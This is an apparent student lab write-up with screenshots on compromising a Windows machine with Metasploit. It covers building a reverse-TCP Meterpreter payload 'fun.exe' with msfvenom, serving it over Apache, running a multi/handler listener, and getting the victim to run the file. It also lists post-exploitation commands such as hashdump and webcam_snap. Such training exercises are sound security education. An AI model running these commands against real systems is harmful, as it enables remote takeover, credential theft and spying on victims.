# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="1920" height="1080" alt="kali linux  Running  - Oracle VirtualBox 25-10-2025 08_38_47" src="https://github.com/user-attachments/assets/8a47f685-7a16-457c-81fa-d1ff5fe48a81" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="580" height="187" alt="Screenshot 2025-10-25 090853" src="https://github.com/user-attachments/assets/fa735b22-9456-4eea-a5a6-a0c5178aac51" />


copy the fun.exe into the apache ```/var/www/html ```folder

<img width="520" height="87" alt="image" src="https://github.com/user-attachments/assets/fa5a74d4-9f6a-46b0-95e5-efdfc19c2727" />


Start apache server ```sudo systemctl apache2 start``` 

<img width="445" height="70" alt="Screenshot 2025-10-25 091234" src="https://github.com/user-attachments/assets/c98de86c-880b-43dc-beae-b7145af422d8" />


Check the status of apache2 ```sudo apache2 status```
<img width="1044" height="244" alt="Screenshot 2025-10-25 091415" src="https://github.com/user-attachments/assets/09630d25-a87e-4f01-836c-1d155d779a68" />


Invoke msfconsole:
<img width="1920" height="1080" alt="kali linux  Running  - Oracle VirtualBox 25-10-2025 08_52_22" src="https://github.com/user-attachments/assets/a7e6852f-162a-4d22-8194-b9fd254baa14" />




Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="613" height="131" alt="Screenshot 2025-10-25 091622" src="https://github.com/user-attachments/assets/ee92dff7-741e-42e9-9f67-318f10b75269" />

<img width="1920" height="1080" alt="kali linux  Running  - Oracle VirtualBox 25-10-2025 09_02_55" src="https://github.com/user-attachments/assets/b6d41892-960b-4406-9548-6f2e08f23325" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

